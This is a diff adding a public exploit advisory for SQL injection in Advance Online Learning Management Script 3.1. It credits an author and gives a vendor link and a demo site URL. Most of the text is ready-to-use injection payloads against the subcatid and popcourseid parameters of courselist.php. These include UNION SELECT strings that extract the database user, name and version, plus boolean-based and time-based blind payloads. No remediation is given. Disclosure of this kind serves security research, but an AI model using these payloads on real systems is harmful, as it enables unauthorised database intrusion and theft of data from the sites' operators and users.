@@ -1,0 +1,54 @@
+# # # # # 
+# Exploit Title: Advance Online Learning Management Script 3.1 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/online-learning-management-script/
+# Demo: http://thavasu.com/demo/online_education/
+# Version: 3.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/courselist.php?subcatid=[SQL]
+# 
+# -9'++UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39))--+-
+# 
+# http://server/courselist.php?subcatid=-9'++UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39))--+-
+# 
+# Parameter: subcatid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: subcatid=9' AND 7659=7659 AND 'Akrr'='Akrr
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: subcatid=9' AND SLEEP(5) AND 'DoFl'='DoFl
+# 
+# 2)
+# http://localhost/[PATH]/courselist.php?popcourseid=[SQL]
+# 
+# 1'++UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39))--+-
+# 
+# http://server/courselist.php?popcourseid=1'++UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39))--+-
+# 
+# Parameter: popcourseid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: popcourseid=1' AND 9182=9182 AND 'vWmu'='vWmu
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: popcourseid=1' AND SLEEP(5) AND 'THTz'='THTz
+# 
+# # # # #
